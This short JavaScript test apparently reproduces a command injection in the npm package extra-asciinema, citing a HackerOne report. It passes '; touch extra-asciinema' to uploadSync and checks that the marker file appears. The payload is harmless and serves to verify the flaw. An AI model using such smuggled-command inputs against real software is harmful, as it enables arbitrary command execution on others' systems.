//https://hackerone.com/reports/863956
test("Command Injection in extra-asciinema", () => {
  const asciinema = require("extra-asciinema");
  const fs = require("fs");
  const path = "./extra-asciinema";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  asciinema.uploadSync("; touch extra-asciinema");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
